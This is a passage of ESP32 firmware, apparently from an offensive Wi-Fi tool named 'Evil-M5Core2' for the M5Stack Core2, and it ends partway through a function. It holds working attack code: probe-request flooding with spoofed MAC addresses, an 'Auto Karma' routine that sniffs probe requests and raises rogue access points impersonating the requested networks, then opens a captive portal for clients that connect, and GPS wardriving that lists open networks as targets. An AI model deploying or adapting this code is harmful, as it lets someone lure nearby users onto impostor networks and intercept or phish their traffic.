  Serial.println("SSID selected: " + probes[selectedIndex]);
  Serial.println("-------------------");
  clonedSSID = probes[selectedIndex];
  waitAndReturnToMenu(probes[selectedIndex] + " selected");
}



bool isProbePresent(String probes[], int numProbes, String probe) {
  for (int i = 0; i < numProbes; i++) {
    if (probes[i] == probe) {
      return true;
    }
  }
  return false;
}



void deleteProbe() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("-------------------");
    Serial.println("Failed to open probes.txt");
    Serial.println("-------------------");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int maxSSIDLength = 23; // Adjust based on your display width
  const int maxDisplay = 11;
  int currentListIndex = 0;
  int listStartIndex = 0;
  int selectedIndex = -1;
  bool needDisplayUpdate = true;

  while (selectedIndex == -1) {
    M5.update();
    handleDnsRequestSerial();
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = listStartIndex + i;
        if (probeIndex >= numProbes) break;

        String ssid = probes[probeIndex];
        if (ssid.length() > maxSSIDLength) {
          ssid = ssid.substring(0, maxSSIDLength) + "..";
        }

        M5.Display.setCursor(10, i * 20 + 10);
        M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(ssid);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }

    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) currentListIndex = numProbes - 1;
      needDisplayUpdate = true;
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numProbes) currentListIndex = 0;
      needDisplayUpdate = true;
    } else if (M5.BtnB.wasPressed()) {
      selectedIndex = currentListIndex;
    }

    listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
  }

  bool success = false;
  if (selectedIndex >= 0 && selectedIndex < numProbes) {
    String selectedProbe = probes[selectedIndex];
    if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
      success = removeProbeFromFile("/probes.txt", selectedProbe);
    }

    if (success) {
      Serial.println("-------------------");
      Serial.println(selectedProbe + " deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu(selectedProbe + " deleted");
    } else {
      waitAndReturnToMenu("Error deleting probe");
    }
  } else {
    waitAndReturnToMenu("No probe selected");
  }
}



int showProbesAndSelect(String probes[], int numProbes) {
  const int maxDisplay = 11; // Maximum number of items to display at once
  int currentListIndex = 0; // Index of the current item in the list
  int listStartIndex = 0; // Index of the first item to display
  bool needDisplayUpdate = true;
  int selectedIndex = -1; // -1 means no selection

  while (selectedIndex == -1) {
    M5.update();
    handleDnsRequestSerial();
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(2);

      for (int i = 0; i < maxDisplay && (listStartIndex + i) < numProbes; i++) {
        M5.Display.setCursor(10, i * 20 + 10);
        M5.Display.setTextColor((listStartIndex + i) == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(probes[listStartIndex + i]);
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }

    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) {
        currentListIndex = numProbes - 1;
      }
      needDisplayUpdate = true;
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numProbes) {
        currentListIndex = 0;
      }
      needDisplayUpdate = true;
    } else if (M5.BtnB.wasPressed()) {
      selectedIndex = currentListIndex;
    }
    listStartIndex = max(0, min(currentListIndex - maxDisplay + 1, numProbes - maxDisplay));
  }

  return selectedIndex;
}

bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
  File originalFile = SD.open(filepath, FILE_READ);
  if (!originalFile) {
    Serial.println("Failed to open the original file for reading");
    return false;
  }

  const char* tempFilePath = "/temp.txt";
  File tempFile = SD.open(tempFilePath, FILE_WRITE);
  if (!tempFile) {
    Serial.println("Failed to open the temp file for writing");
    originalFile.close();
    return false;
  }

  bool probeRemoved = false;
  while (originalFile.available()) {
    String line = originalFile.readStringUntil('\n');
    if (line.endsWith("\r")) {
      line = line.substring(0, line.length() - 1);
    }

    if (!probeRemoved && line == probeToRemove) {
      probeRemoved = true;
    } else {
      tempFile.println(line);
    }
  }

  originalFile.close();
  tempFile.close();

  SD.remove(filepath);
  SD.rename(tempFilePath, filepath);

  return probeRemoved;
}

void deleteAllProbes() {
  if (confirmPopup("Delete All Probes ?")) {
    File file = SD.open("/probes.txt", FILE_WRITE);
    if (file) {
      file.close();
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("-------------------");
      Serial.println("Probes deleted successfully");
      Serial.println("-------------------");
    } else {
      waitAndReturnToMenu("Error..");
      Serial.println("-------------------");
      Serial.println("Error opening file for deletion");
      Serial.println("-------------------");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}

//KARMA-PART-FUNCTIONS-END


//probe attack


uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
    int index = random(0, sizeof(charset) - 1);
    randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
  String mac = generateRandomMAC();
  uint8_t macArray[6];
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
  esp_wifi_set_mac(WIFI_IF_STA, macArray);
  delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customProbes;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customProbes;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomProbes=")) {
      String probesStr = line.substring(String("CustomProbes=").length());
      int idx = 0;
      while ((idx = probesStr.indexOf(',')) != -1) {
        customProbes.push_back(probesStr.substring(0, idx));
        probesStr = probesStr.substring(idx + 1);
      }
      if (probesStr.length() > 0) {
        customProbes.push_back(probesStr);
      }
      break;
    }
  }
  file.close();
  return customProbes;
}



int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
  WiFi.mode(WIFI_MODE_STA);
  isProbeAttackRunning = true;
  useCustomProbes = false;

  if (!isItSerialCommand) {
    useCustomProbes = confirmPopup("Use custom probes?");
    M5.Display.clear();
    if (useCustomProbes) {
      customProbes = readCustomProbes("/config/config.txt");
    } else {
      customProbes.clear();
    }
  } else {
    M5.Display.clear();
    isItSerialCommand = false;
    customProbes.clear();
  }
  int probeCount = 0;
  int delayTime = 500; // initial probes delay
  unsigned long previousMillis = 0;
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");

  int probesTextX = 10;
  String probesText = "Probe Attack running...";
  M5.Display.setCursor(probesTextX, 50);
  M5.Display.println(probesText);
  probesText = "Probes sent: ";
  M5.Display.setCursor(probesTextX, 70);
  M5.Display.print(probesText);
  Serial.println("-------------------");
  Serial.println("Starting Probe Attack");
  Serial.println("-------------------");

  while (isProbeAttackRunning) {
    unsigned long currentMillis = millis();
    handleDnsRequestSerial();
    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;
      setRandomMAC_STA();
      setNextWiFiChannel();
      String ssid;
      if (!customProbes.empty()) {
        ssid = customProbes[probeCount % customProbes.size()];
      } else {
        ssid = generateRandomSSID(32);
      }
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));
        pixels.setPixelColor(9, pixels.Color(255, 0, 0));
        pixels.show();
        delay(50);

        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.setPixelColor(9, pixels.Color(0, 0, 0));
        pixels.show();
      }
      WiFi.begin(ssid.c_str(), "");

      M5.Display.setCursor(probesTextX + probesText.length() * 12, 70);
      M5.Display.fillRect(probesTextX + probesText.length() * 12, 70, 50, 20, TFT_BLACK);
      M5.Display.print(++probeCount);

      M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

      M5.Display.setCursor(100, M5.Display.height() / 2);
      M5.Display.print("Delay: " + String(delayTime) + "ms");

      Serial.println("Probe sent: " + ssid);
    }

    M5.update();
    if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      lastDebounceTime = currentMillis;
      delayTime = max(200, delayTime - 100); // min delay
    }
    if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      lastDebounceTime = currentMillis;
      delayTime = min(1000, delayTime + 100); // max delay
    }
    if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      isProbeAttackRunning = false;
    }

  }
  Serial.println("-------------------");
  Serial.println("Stopping Probe Attack");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu();
}

int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  currentChannel++;
  if (currentChannel > 14) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg1);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


// Auto karma
bool isAPDeploying = false;

void startAutoKarma() {
  ESP_BT.end();
  bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg1);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");

  readConfigFile("/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
    uint8_t ssid_length_Karma_Auto = frame[25];
    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
      char tempSSID[33];
      memset(tempSSID, 0, sizeof(tempSSID));
      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
        tempSSID[i] = (char)frame[26 + i];
      }
      tempSSID[ssid_length_Karma_Auto] = '\0';
      memset(lastSSID, 0, sizeof(lastSSID));
      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
      newSSIDAvailable = true;
    }
  }
}



bool readConfigFile(const char* filename) {
  whitelist.clear();
  File configFile = SD.open(filename);
  if (!configFile) {
    Serial.println("Failed to open config file");
    return false;
  }

  while (configFile.available()) {
    String line = configFile.readStringUntil('\n');
    if (line.startsWith("KarmaAutoWhitelist=")) {
      int startIndex = line.indexOf('=') + 1;
      String ssidList = line.substring(startIndex);
      if (!ssidList.length()) {
        break;
      }
      int lastIndex = 0, nextIndex;
      while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
        whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
        lastIndex = nextIndex + 1;
      }
      whitelist.push_back(ssidList.substring(lastIndex).c_str());
    }
  }
  configFile.close();
  return true;
}

bool isSSIDWhitelisted(const char* ssid) {
  for (const auto& wssid : whitelist) {
    if (wssid == ssid) {
      return true;
    }
  }
  return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  // Force unicast byte
  mac[0] &= 0xFE;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_APKarma() {

  esp_wifi_stop();

  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_AP);
  }

  String macKarma = generateRandomMACKarma();
  uint8_t macArrayKarma[6];
  sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

  esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
  if (ret != ESP_OK) {
    Serial.print("Error setting MAC: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }

  ret = esp_wifi_start();
  if (ret != ESP_OK) {
    Serial.print("Error starting WiFi: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }
}



String getMACAddress() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
    M5.update();

    if (M5.BtnB.wasPressed()) {
      isAutoKarmaActive = false;
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      inMenu = true;
      memset(lastSSID, 0, sizeof(lastSSID));
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      newSSIDAvailable = false;
      esp_wifi_set_promiscuous(false);
      Serial.println("-------------------");
      Serial.println("Karma Auto Attack Stopped....");
      Serial.println("-------------------");
      break;
    }
    if (newSSIDAvailable) {
      newSSIDAvailable = false;
      activateAPForAutoKarma(lastSSID); // Activate the AP
      isWaitingForProbeDisplayed = false;
    } else {
      if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
        displayWaitingForProbe();
        Serial.println("-------------------");
        Serial.println("Waiting for probe....");
        Serial.println("-------------------");
        isWaitingForProbeDisplayed = true;
      }
    }

    delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
  karmaSuccess = false;
  if (isSSIDWhitelisted(ssid)) {
    Serial.println("-------------------");
    Serial.println("SSID in the whitelist, skipping : " + String(ssid));
    Serial.println("-------------------");
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(255, 255, 255));
      pixels.setPixelColor(9, pixels.Color(255, 255, 255));
      pixels.show();
      delay(50);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.setPixelColor(9, pixels.Color(0, 0, 0));
      pixels.show();
    }
    return;
  }
  if ((ssid, lastDeployedSSID) == 0) {
    Serial.println("-------------------");
    Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
    Serial.println("-------------------");
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(0, 255, 0));
      pixels.setPixelColor(9, pixels.Color(0, 255, 0));
      pixels.show();
      delay(50);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.setPixelColor(9, pixels.Color(0, 0, 0));
      pixels.show();
    }
    return;
  }
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
  }
  isAPDeploying = true;
  isInitialDisplayDone = false;
  setRandomMAC_APKarma(); // Set random MAC for AP

  if (captivePortalPassword == "") {
    WiFi.softAP(ssid);
  } else {
    WiFi.softAP(ssid , captivePortalPassword.c_str());
  }
  // Display MAC, SSID, and channel
  String macAddress = getMACAddress();
  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.print("MAC Address: "); Serial.println(macAddress);
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
    displayAPStatus(ssid, startTime, autoKarmaAPDuration);
    handleDnsRequestSerial();

    M5.update();

    if (M5.BtnB.wasPressed()) {
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.setPixelColor(9, pixels.Color(0, 0, 0));
        pixels.show();
      }
      break;
    }

    int clientCount = WiFi.softAPgetStationNum();
    if (clientCount > 0) {
      karmaSuccess = true;
      clonedSSID = String(ssid);
      isCaptivePortalOn = true;
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      inMenu = true;
      Serial.println("-------------------");
      Serial.println("Karma Successful for : " + String(clonedSSID));
      if (vibration) {
        M5.Power.Axp192.setLDO3(3300);
        delay(500);
        M5.Power.Axp192.setLDO3(0);
      }
      Serial.println("-------------------");
      memset(lastSSID, 0, sizeof(lastSSID));
      newSSIDAvailable = false;
      waitAndReturnToMenu("Karma Successful !!! ");
      return;
    }
    delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  ESP_BT.end();
  bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg1 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg1);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");

  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
  }
}


void displayWaitingForProbe() {
  if (!isWaitingForProbeDisplayed) {
    M5.Display.clear();
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.println("Stop Auto");
    M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
    M5.Display.print("Waiting for probe");

    isWaitingForProbeDisplayed = true;
  }

  unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
    lastProbeDisplayUpdate = currentTime;
    probeDisplayState = (probeDisplayState + 1) % 4;

    int x = 50 + 12 * strlen("Waiting for probe");
    int y = M5.Display.height() / 2 - 20;
    int width = 36;
    int height = 20;

    M5.Display.fillRect(x, y, width, height, TFT_BLACK);

    M5.Display.setCursor(x, y);
    for (int i = 0; i < probeDisplayState; i++) {
      M5.Display.print(".");
    }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();

  if (!isInitialDisplayDone) {
    M5.Display.clear();
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
    M5.Display.println(String(ssid));
    M5.Display.setCursor((M5.Display.width() - 15 * strlen("Left Time: ")) / 2, 90);
    M5.Display.print("Left Time: ");
    M5.Display.setCursor((M5.Display.width() - 12 * strlen("Connected Client: ")) / 2, 130);
    M5.Display.print("Connected Client: ");

    M5.Display.setCursor(140, 220);
    M5.Display.println("Stop");
    isInitialDisplayDone = true;
  }

  int timeValuePosX = (M5.Display.width() + 12 * strlen("Left Time: ")) / 2;
  int timeValuePosY = 90;
  M5.Display.fillRect(timeValuePosX, timeValuePosY, 12 * 5, 20, TFT_BLACK);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.println(" s");

  int clientValuePosX = (M5.Display.width() + 12 * strlen("Connected Client: ")) / 2;
  int clientValuePosY = 130;
  M5.Display.fillRect(clientValuePosX, clientValuePosY, 12 * 5, 20, TFT_BLACK);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

//Auto karma end


String createPreHeader() {
  String preHeader = "WigleWifi-1.4";
  preHeader += ",appRelease=v1.3.9"; // Remplacez [version] par la version de votre application
  preHeader += ",model=Core2";
  preHeader += ",release=v1.3.9"; // Remplacez [release] par la version de l'OS de l'appareil
  preHeader += ",device=Evil-M5Core2"; // Remplacez [device name] par un nom de périphérique, si souhaité
  preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
  preHeader += ",board=M5Stack Core2";
  preHeader += ",brand=M5Stack";
  return preHeader;
}

String createHeader() {
  return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // Déclaration de la variable pour la précision

void wardrivingMode() {

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("-------------------");
  Serial.println("Starting Wardriving");
  Serial.println("-------------------");
  M5.Lcd.fillScreen(TFT_BLACK);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.printf("Scanning...");
  M5.Lcd.setCursor(0, 40);
  M5.Lcd.println("No GPS Data");
  delay(1000);
  if (!SD.exists("/wardriving")) {
    SD.mkdir("/wardriving");
  }

  File root = SD.open("/wardriving");
  int maxIndex = 0;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    String name = entry.name();
    int startIndex = name.indexOf('-') + 1;
    int endIndex = name.indexOf('.');
    if (startIndex > 0 && endIndex > startIndex) {
      int fileIndex = name.substring(startIndex, endIndex).toInt();
      if (fileIndex > maxIndex) maxIndex = fileIndex;
    }
    entry.close();
  }
  root.close();

  bool exitWardriving = false;
  bool scanStarted = false;
  while (!exitWardriving) {
    M5.update();
    handleDnsRequestSerial();

    if (!scanStarted) {
      WiFi.scanNetworks(true, true);
      scanStarted = true;
    }

    bool gpsDataAvailable = false;
    String gpsData;

    while (Serial2.available() > 0 && !gpsDataAvailable) {
      if (gps.encode(Serial2.read())) {
        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
          lat = gps.location.lat();
          lng = gps.location.lng();
          alt = gps.altitude.meters();
          accuracy = gps.hdop.value();
          gpsDataAvailable = true;

          // Affichage des informations GPS sur l'écran
          M5.Lcd.setCursor(0, 40);
          M5.Lcd.println("Latitude:  ");
          M5.Lcd.setCursor(0, 60);
          M5.Lcd.println(String(gps.location.lat(), 6));

          M5.Lcd.setCursor(170, 40);
          M5.Lcd.println("Longitude:");
          M5.Lcd.setCursor(170, 60);
          M5.Lcd.println(String(gps.location.lng(), 6));

          M5.Lcd.setCursor(0, 90);
          M5.Lcd.println("Satellites:");
          M5.Lcd.setCursor(0, 110);
          M5.Lcd.println(String(gps.satellites.value()) + "  ");
          // Altitude
          M5.Lcd.setCursor(170, 90);
          M5.Lcd.println("Altitude:");
          M5.Lcd.setCursor(170, 110);
          M5.Lcd.println(String(gps.altitude.meters(), 2) + "m");

          // Date et Heure
          String dateTime = formatTimeFromGPS();
          M5.Lcd.setCursor(0, 140);
          M5.Lcd.println("Date/Time:");
          M5.Lcd.setCursor(0, 160);
          M5.Lcd.println(dateTime);
        }
      }
    }


    int n = WiFi.scanComplete();
    if (n > -1) {
      String currentTime = formatTimeFromGPS();
      String wifiData = "\n";
      for (int i = 0; i < n; ++i) {
        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
        line += currentTime + ",";
        line += String(WiFi.channel(i)) + ",";
        line += String(WiFi.RSSI(i)) + ",";
        line += String(lat, 6) + "," + String(lng, 6) + ",";
        line += String(alt) + "," + String(accuracy) + ",";
        line += "WIFI";
        wifiData += line + "\n";
      }

      Serial.println("----------------------------------------------------");
      Serial.print("WiFi Networks: " + String(n));
      Serial.print(wifiData);
      Serial.println("----------------------------------------------------");

      String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";

      // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
      File file = SD.open(fileName, FILE_READ);
      bool isNewFile = !file || file.size() == 0;
      if (file) {
        file.close();
      }

      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);

      if (file) {
        if (isNewFile) {
          file.println(createPreHeader());
          file.println(createHeader());
        }
        file.print(wifiData);
        file.close();
      }

      scanStarted = false;
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.printf("Near WiFi: %d  \n", n);
    }

    if (M5.BtnB.isPressed()) {
      exitWardriving = true;
      if (confirmPopup("List Open Networks?")) {
        createKarmaList(maxIndex);
      }
      waitAndReturnToMenu("Stopping Wardriving.");
      Serial.println("-------------------");
      Serial.println("Stopping Wardriving");
      Serial.println("-------------------");
    }
  }

  Serial.println("-------------------");
  Serial.println("Session Saved.");
  Serial.println("-------------------");
}


String getCapabilities(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
    case WIFI_AUTH_WEP: return "[WEP][ESS]";
    case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
    case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
    default: return "[UNKNOWN]";
  }
}

String formatTimeFromGPS() {
  if (gps.time.isValid() && gps.date.isValid()) {
    char dateTime[30];
    sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
            gps.time.hour(), gps.time.minute(), gps.time.second());
    return String(dateTime);
  } else {
    return "0000-00-00 00:00:00";
  }
}


void createKarmaList(int maxIndex) {

  std::set<std::string> uniqueSSIDs;
  // Lire le contenu existant de KarmaList.txt et l'ajouter au set
  File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
  if (karmaListRead) {
    while (karmaListRead.available()) {
      String ssid = karmaListRead.readStringUntil('\n');
      ssid.trim();
      if (ssid.length() > 0) {
        uniqueSSIDs.insert(ssid.c_str());
      }
    }
    karmaListRead.close();
  }

  File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
  if (!file) {
    Serial.println("Error opening scan file");
    return;
  } else {
    Serial.println("Scan file opened successfully");
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
      String ssid = extractSSID(line);
      uniqueSSIDs.insert(ssid.c_str());
    }
  }
  file.close();

  // Écrire le set dans KarmaList.txt
  File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
  if (!karmaListWrite) {
    Serial.println("Error opening KarmaList.txt for writing");
    return;
  } else {
